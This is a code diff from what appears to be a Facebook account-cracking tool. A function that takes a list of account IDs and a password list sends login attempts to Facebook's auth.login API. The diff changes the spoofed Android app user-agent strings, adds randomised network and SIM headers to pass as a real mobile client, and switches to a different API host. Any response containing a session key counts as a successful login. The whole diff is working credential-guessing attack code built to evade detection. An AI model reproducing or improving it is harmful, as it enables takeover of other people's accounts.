@@ -276,8 +276,8 @@ def ___random___(ids,passlist):
             #___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung ;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
             #___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2139};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            # ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2060};'+f'FBLC/it_IT;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
-            ___MSUA___ = '[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
-       #     ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.75,width=720,height=1361};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
+           # ___MSUA___ = '[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
+            ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.75,width=720,height=1361};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
          #   ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2145};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
          #   ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1920};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            # ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.625,width=1080,height=2094};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
@@ -309,25 +309,29 @@ def ___random___(ids,passlist):
             "locale":"en_US","client_country_code":"US",
             'fb_api_req_friendly_name':'authenticate',
             "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
-            headers = {'authority': 'm.alpha.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'dpr': '2',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"TECNO BF7"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"12.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'ua8'}
-            url = 'https://m.alpha.facebook.com/method/auth.login'
+            head ={
+            'Authorization':f'OAuth {accessToken}',
+            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
+            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'X-FB-device-group': str(random.randint(2000, 4000)),
+            "X-FB-Friendly-Name": "ViewerReactionsMutation",
+            "X-FB-Request-Analytics-Tags": "graphservice",
+            'X-FB-Friendly-Name':'authenticate',
+            'X-FB-Connection-Type':'unknown',
+            'X-FB-connection-quality':'EXCELLENT',
+            "X-Tigon-Is-Retry": "False",
+            'User-Agent':___MSUA___,
+            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+            'Accept-Encoding':'gzip, deflate',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            "X-FB-Client-IP": "True",
+            "X-FB-Server-Cluster": "True",
+            'X-FB-HTTP-Engine': 'Liger'
+            }
+            url = 'https://b-api.facebook.com/method/auth.login'
             po = requests.post(url,data=data,headers=head,allow_redirects=False).text
             q = json.loads(po)
             if 'session_key' in q:
